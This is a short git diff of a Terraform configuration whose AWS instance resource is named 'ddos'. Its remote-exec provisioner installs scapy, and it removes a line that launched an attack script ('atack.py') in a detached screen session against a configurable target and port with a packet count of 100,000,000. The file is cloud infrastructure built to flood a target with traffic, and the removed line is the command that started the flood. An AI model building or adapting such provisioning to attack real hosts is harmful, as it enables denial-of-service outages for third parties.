@@ -69,11 +69,9 @@ resource "aws_instance" "ddos" {
   }
   provisioner "remote-exec" {
     inline = [
-        "set -o errexit",
         "sudo apt update",
         "sudo apt update",
         "sudo apt install python3-scapy -y",
-        "screen -d -m sudo python3 /tmp/atack.py -t ${var.goal_atack}  -p ${var.port_atack} -c 100000000",
     ]
   }
 }
